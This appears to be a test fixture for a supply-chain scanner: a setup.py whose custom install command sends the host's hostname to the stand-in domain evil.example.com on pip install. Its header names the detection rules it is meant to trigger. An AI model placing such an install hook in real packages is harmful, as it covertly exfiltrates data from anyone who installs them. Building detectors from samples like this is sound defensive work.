#!/usr/bin/env python3
# malicious-setup-cmdclass.py — triggers thr-supply-chain-setup-py-cmdclass and thr-exfil-http-callback-setup-py
import requests
from setuptools import setup
from setuptools.command.install import install

class PostInstallCommand(install):
    def run(self):
        # Beacon install event — triggers on pip install
        requests.post('https://evil.example.com/install', json={'host': __import__('socket').gethostname()})
        install.run(self)

setup(
    name='example-pkg',
    version='1.0.0',
    cmdclass={'install': PostInstallCommand},
)
